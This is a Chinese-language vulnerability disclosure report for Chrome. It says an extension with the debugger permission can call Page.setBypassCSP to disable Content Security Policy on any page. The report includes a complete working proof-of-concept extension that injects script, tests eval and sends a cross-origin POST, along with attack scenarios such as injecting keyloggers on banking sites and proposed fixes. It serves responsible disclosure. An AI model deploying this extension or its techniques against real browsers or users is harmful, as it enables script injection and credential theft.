# VRP 报告: Chrome 扩展通过 Page.setBypassCSP 绕过内容安全策略

## 1. 漏洞详情

### 类型
逻辑漏洞 — Chrome DevTools Protocol 权限检查缺失导致不受信任的扩展客户端可完全禁用任意页面的 Content Security Policy (CSP)

### 影响组件
`content/browser/devtools/protocol/page_handler.cc:1844-1847`

### 漏洞仓库地址（代码位置）

| 文件 | 行号 | 作用 |
|------|------|------|
| `content/browser/devtools/protocol/page_handler.cc` | 1844-1847 | **BUG**: `SetBypassCSP()` 无任何信任检查 |
| `content/browser/devtools/devtools_session.h` | ~225 | `PageHandler` 在 `IsDomainAvailableToUntrustedClient` 列表中 |
| `content/browser/renderer_host/navigation_request.cc` | ~10855 | Browser 端: bypass 激活时跳过 CSP 添加到 PolicyContainer |
| `third_party/blink/renderer/core/loader/document_loader.cc` | ~3847 | Renderer 端: bypass 激活时返回空 CSP |
| `third_party/blink/renderer/core/loader/http_equiv.cc` | ~85 | Meta 标签 CSP 在 bypass 激活时被完全忽略 |
| `chrome/browser/extensions/api/debugger/debugger_api.cc` | 229-231 | 仅 Perfetto 扩展被信任，其他均为 untrusted |

### 漏洞原理

Chrome DevTools Protocol (CDP) 中 `Page.setBypassCSP` 命令可以完全禁用目标页面的 Content Security Policy。该命令的设计意图是仅供受信任的 DevTools 前端使用（如 Chrome 内置 DevTools），但实现中缺少信任验证：

```cpp
// content/browser/devtools/protocol/page_handler.cc:1844-1847
Response PageHandler::SetBypassCSP(bool enabled) {
  bypass_csp_ = enabled;           // ← 无任何权限检查！
  return Response::FallThrough();
}
```

**对比其他敏感操作的正确实现模式:**

```cpp
// 正确模式示例 — page_handler.cc 中其他方法:
Response PageHandler::SetBypassCSP(bool enabled) {
  if (!is_trusted_)                 // ← 应该有这个检查
    return Response::ServerError("Not allowed");
  bypass_csp_ = enabled;
  return Response::FallThrough();
}
```

**为什么扩展能调用此命令:**

Chrome 通过 `IsDomainAvailableToUntrustedClient` 模板控制扩展可访问的 CDP domain。`Page` domain 在该白名单中（因为包含许多无害命令如 `Page.captureScreenshot`），但 `Page.setBypassCSP` 是其中危害最大的命令之一，却没有独立的信任门控。

**CSP bypass 的完整效果链:**

1. 扩展调用 `Page.setBypassCSP({enabled: true})` → `PageHandler::bypass_csp_` 设为 true
2. 页面导航/刷新时，`navigation_request.cc` 中 `ShouldBypassCSP()` 返回 true
3. Browser 端: CSP 不被添加到 PolicyContainer（HTTP header CSP 被丢弃）
4. Renderer 端: `DocumentLoader` 返回空 CSP，`http_equiv.cc` 忽略 meta CSP
5. **结果**: 页面完全没有 CSP 保护，等同于从未设置过 CSP

---

## 2. 漏洞影响

### 前提条件

| 条件 | 详情 |
|------|------|
| **扩展权限** | `"debugger"` permission（安装时有权限警告: "Read and change all your data on all websites"） |
| **用户交互** | 附加调试器时显示黄色信息栏（用户需不主动取消） |
| **企业场景** | 通过策略安装的扩展(`force_installed`): 无信息栏，完全静默 |
| **`--silent-debugging`** | 使用此命令行标志时无信息栏 |
| **目标页面** | 任意网页（CSP 保护越严格，影响越大） |

### 效果（安全影响）

| 影响维度 | 描述 |
|---------|------|
| **XSS 全面放开** | 内联脚本、`eval()`、`new Function()` 等全部可用 |
| **数据外泄** | `connect-src` 限制被移除，可向任意服务器发送数据 |
| **第三方脚本注入** | `script-src` 限制被移除，可加载任意外部脚本 |
| **点击劫持** | `frame-ancestors` 限制被移除 |
| **混合内容** | `upgrade-insecure-requests` 失效 |
| **权限绕过本质** | 扩展获得了 Chrome DevTools 前端级别的能力，打破了信任边界 |

### 攻击场景

**场景 1: 绕过银行网站 CSP 窃取凭证**
1. 恶意扩展附加到银行页面
2. 禁用 CSP → 注入键盘记录脚本
3. CSP 原本会阻止内联脚本和外泄数据，现在无效

**场景 2: 企业策略安装扩展静默攻击**
1. 被入侵的企业 Chrome 策略推送恶意扩展
2. 无任何用户交互，静默禁用所有页面 CSP
3. 注入数据收集脚本，员工无感知

**场景 3: 绕过 GitHub/Google 等站点的严格 CSP**
1. 这些站点依赖严格 CSP 作为 XSS 防御的最后一层
2. CSP 被禁用后，任何反射型/存储型 XSS 都可被利用

### 严重性评估: High (Privilege Escalation + Full CSP Bypass)

---

## 3. 复现方式

### 环境准备

- **Chrome 版本**: Chrome 130+ stable（任何近期版本，含 Canary/Dev/Beta）
- **操作系统**: Windows / macOS / Linux 均可
- **无需特殊 flag 或配置**

### Step 1: 创建 PoC 扩展

创建一个文件夹 `csp_bypass_extension/`，包含以下 3 个文件：

#### manifest.json
```json
{
  "manifest_version": 3,
  "name": "CSP Bypass PoC",
  "version": "1.0",
  "description": "Demonstrates Page.setBypassCSP available to untrusted extension clients",
  "permissions": ["debugger", "activeTab"],
  "action": {
    "default_popup": "popup.html",
    "default_title": "CSP Bypass PoC"
  }
}
```

#### popup.html
```html
<!DOCTYPE html>
<html>
<head>
  <style>
    body { width: 420px; padding: 16px; font-family: monospace; font-size: 13px; }
    h2 { margin: 0 0 12px 0; font-size: 15px; }
    #log { background: #111; color: #0f0; padding: 10px; height: 260px; overflow-y: auto; white-space: pre-wrap; border-radius: 4px; }
    button { margin-top: 10px; padding: 8px 16px; cursor: pointer; font-size: 13px; }
    .fail { color: #f44; }
    .ok { color: #4f4; }
    .info { color: #ff0; }
  </style>
</head>
<body>
  <h2>Page.setBypassCSP PoC</h2>
  <p>Target: current active tab</p>
  <div id="log"></div>
  <button id="run">Run Exploit</button>
  <script src="popup.js"></script>
</body>
</html>
```

#### popup.js
```javascript
const logEl = document.getElementById('log');
function log(msg, cls) {
  const span = document.createElement('span');
  span.className = cls || '';
  span.textContent = msg + '\n';
  logEl.appendChild(span);
  logEl.scrollTop = logEl.scrollHeight;
}

function sendCommand(tabId, method, params) {
  return new Promise((resolve, reject) => {
    chrome.debugger.sendCommand({tabId}, method, params || {}, (result) => {
      if (chrome.runtime.lastError) {
        reject(new Error(chrome.runtime.lastError.message));
      } else {
        resolve(result);
      }
    });
  });
}

function attach(tabId) {
  return new Promise((resolve, reject) => {
    chrome.debugger.attach({tabId}, "1.3", () => {
      if (chrome.runtime.lastError) {
        reject(new Error(chrome.runtime.lastError.message));
      } else {
        resolve();
      }
    });
  });
}

function detach(tabId) {
  return new Promise((resolve) => {
    chrome.debugger.detach({tabId}, () => resolve());
  });
}

document.getElementById('run').addEventListener('click', async () => {
  try {
    const [tab] = await chrome.tabs.query({active: true, currentWindow: true});
    if (!tab) { log("No active tab found", "fail"); return; }

    log(`[1] Target: ${tab.url}`, "info");

    log("[2] Attaching debugger...");
    await attach(tab.id);
    log("[2] Debugger attached", "ok");

    log("[3] Enabling Page domain...");
    await sendCommand(tab.id, "Page.enable");
    log("[3] Page domain enabled", "ok");

    log("[4] Testing script injection BEFORE bypass...");
    const beforeResult = await sendCommand(tab.id, "Runtime.evaluate", {
      expression: `
        (function() {
          try {
            let s = document.createElement('script');
            s.textContent = 'window.__csp_bypass_test_before = true';
            document.head.appendChild(s);
            return {
              success: !!window.__csp_bypass_test_before,
              note: "inline script executed (CSP may be permissive or absent)"
            };
          } catch(e) {
            return {success: false, error: e.message};
          }
        })()
      `,
      returnByValue: true
    });

    const beforeVal = beforeResult.result.value;
    if (beforeVal && beforeVal.success) {
      log(`[4] Note: page may not have strict CSP (inline script succeeded)`, "info");
      log(`    For best demo, use a page with strict CSP (e.g., github.com)`, "info");
    } else {
      log(`[4] Good: inline script blocked by CSP`, "ok");
    }

    log("[5] Calling Page.setBypassCSP({enabled: true})...", "info");
    await sendCommand(tab.id, "Page.setBypassCSP", {enabled: true});
    log("[5] Page.setBypassCSP SUCCEEDED!", "ok");
    log("    (This should have been rejected for untrusted clients)", "fail");

    log("[6] Reloading page to apply CSP bypass on new document...");
    await sendCommand(tab.id, "Page.reload");
    await new Promise(r => setTimeout(r, 2000));

    log("[7] Testing script injection AFTER bypass...");
    const afterResult = await sendCommand(tab.id, "Runtime.evaluate", {
      expression: `
        (function() {
          let s = document.createElement('script');
          s.textContent = 'window.__csp_bypass_test_after = "BYPASSED"';
          document.head.appendChild(s);

          let evalWorks = false;
          try { eval('evalWorks = true'); } catch(e) {}

          let cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');

          return {
            inlineScript: window.__csp_bypass_test_after === "BYPASSED",
            evalWorks: evalWorks,
            cspMetaPresent: !!cspMeta,
            documentURL: document.URL,
            note: "If inlineScript=true on a CSP-protected page, the bypass worked"
          };
        })()
      `,
      returnByValue: true
    });

    const afterVal = afterResult.result.value;
    log("[7] Results:", "info");
    log(`    Inline script executed: ${afterVal.inlineScript}`, afterVal.inlineScript ? "ok" : "fail");
    log(`    eval() works: ${afterVal.evalWorks}`, afterVal.evalWorks ? "ok" : "fail");
    log(`    Document URL: ${afterVal.documentURL}`);

    if (afterVal.inlineScript) {
      log("\n=== CSP BYPASS CONFIRMED ===", "ok");
      log("Page.setBypassCSP disabled all CSP protections", "ok");
      log("Extension (untrusted client) should NOT have this ability", "fail");
    }

    log("\n[8] Demonstrating fetch to arbitrary origin (CSP connect-src bypass)...");
    const fetchResult = await sendCommand(tab.id, "Runtime.evaluate", {
      expression: `
        (function() {
          try {
            let controller = new AbortController();
            setTimeout(() => controller.abort(), 100);
            fetch('https://httpbin.org/post', {
              method: 'POST',
              body: 'csp_bypass_test=1',
              signal: controller.signal
            }).catch(() => {});
            return {fetchAllowed: true, note: "fetch to arbitrary origin not blocked by CSP"};
          } catch(e) {
            return {fetchAllowed: false, error: e.message};
          }
        })()
      `,
      returnByValue: true
    });

    const fetchVal = fetchResult.result.value;
    log(`    Fetch to external origin: ${fetchVal.fetchAllowed ? "ALLOWED" : "blocked"}`,
        fetchVal.fetchAllowed ? "ok" : "fail");

    log("\n[9] Disabling CSP bypass and detaching...");
    await sendCommand(tab.id, "Page.setBypassCSP", {enabled: false});
    await detach(tab.id);
    log("[9] Cleaned up", "ok");

    log("\n=== PoC Complete ===", "info");
    log("The Page.setBypassCSP command succeeded for an untrusted", "info");
    log("extension client without any IsTrusted() check.", "info");

  } catch(e) {
    log(`ERROR: ${e.message}`, "fail");
    log("Make sure you click 'allow' on the debugging infobar", "info");
  }
});
```

### Step 2: 安装扩展

1. 打开 Chrome → 地址栏输入 `chrome://extensions/`
2. 右上角打开 **"开发者模式"** 开关
3. 点击 **"加载已解压的扩展程序"**
4. 选择 `csp_bypass_extension/` 文件夹
5. 扩展安装成功，工具栏出现图标

### Step 3: 准备测试页面

选择一个有严格 CSP 的页面（推荐）：
- **github.com** — 有严格的 `script-src` 和 `connect-src`
- **accounts.google.com** — 严格 CSP
- 或任何设置了 CSP header 的网站

你也可以用本地测试页面（创建 `test_csp.html`）：
```html
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="Content-Security-Policy" 
        content="default-src 'self'; script-src 'none'; connect-src 'none'">
  <title>CSP Test Page</title>
</head>
<body>
  <h1>This page has strict CSP: script-src 'none'</h1>
  <p>No scripts should execute here.</p>
</body>
</html>
```

用 Python 简单服务器托管：`python3 -m http.server 8080`，然后访问 `http://localhost:8080/test_csp.html`

### Step 4: 执行验证

1. 在目标页面上，点击扩展图标（工具栏中的 "CSP Bypass PoC"）
2. 弹出窗口显示 PoC 界面
3. 页面顶部会出现黄色信息栏："CSP Bypass PoC started debugging this browser"
4. **不要点击取消** — 保持信息栏
5. 点击 **"Run Exploit"** 按钮
6. 观察日志输出

### Step 5: 验证结果

**成功标志:**
- `[5] Page.setBypassCSP SUCCEEDED!` — 命令被接受
- `[7] Inline script executed: true` — 内联脚本在 CSP 保护页面上执行
- `[7] eval() works: true` — eval 在 CSP 保护页面上可用
- `=== CSP BYPASS CONFIRMED ===`

**如果在 github.com 上测试:**
- Step [4] 应显示 "Good: inline script blocked by CSP"（bypass 前 CSP 有效）
- Step [7] 应显示 "Inline script executed: true"（bypass 后 CSP 无效）

---

## 4. 设备指纹

| 字段 | 值 |
|------|-----|
| **Chrome 版本** | 所有支持 CDP Page domain 的版本 (Chrome 60+) |
| **构建类型** | Release (production) |
| **平台** | All (Windows/macOS/Linux/ChromeOS) |
| **所需 Flag** | 无 |
| **所需权限** | 扩展具有 `debugger` permission |
| **影响渠道** | Stable, Beta, Dev, Canary |
| **用户交互** | 调试器信息栏（策略安装扩展跳过） |
| **网络要求** | 无（本地攻击） |
| **Renderer Compromise** | 不需要 |
| **Manifest 版本** | V2 或 V3 均可 |

---

## 5. 建议修复

### 方案 A: 添加 `is_trusted_` 检查（推荐）

```cpp
// content/browser/devtools/protocol/page_handler.cc
Response PageHandler::SetBypassCSP(bool enabled) {
  if (!is_trusted_)
    return Response::InvalidParams("Not allowed for untrusted clients");
  bypass_csp_ = enabled;
  return Response::FallThrough();
}
```

### 方案 B: 使用 `AllowUnsafeOperations()` 检查

```cpp
Response PageHandler::SetBypassCSP(bool enabled) {
  if (!client_->AllowUnsafeOperations())
    return Response::InvalidParams("Operation not allowed");
  bypass_csp_ = enabled;
  return Response::FallThrough();
}
```

### 方案 C: 从 untrusted 可用命令列表中移除

在 `page_handler.cc` 的命令注册中将 `SetBypassCSP` 标记为仅限 trusted client。

---

## 6. 相关引用

- `content/browser/devtools/protocol/page_handler.cc:1844-1847` — Bug 位置
- `content/browser/devtools/devtools_session.h:~225` — PageHandler 在 untrusted 白名单中
- `content/browser/devtools/devtools_instrumentation.cc:1052-1065` — `ShouldBypassCSP()` 消费点
- `content/browser/renderer_host/navigation_request.cc:~10855` — Browser 端 CSP 跳过
- `third_party/blink/renderer/core/loader/document_loader.cc:~3847` — Renderer 端 CSP 跳过
- `chrome/browser/extensions/api/debugger/debugger_api.cc:229-231` — 扩展信任判定
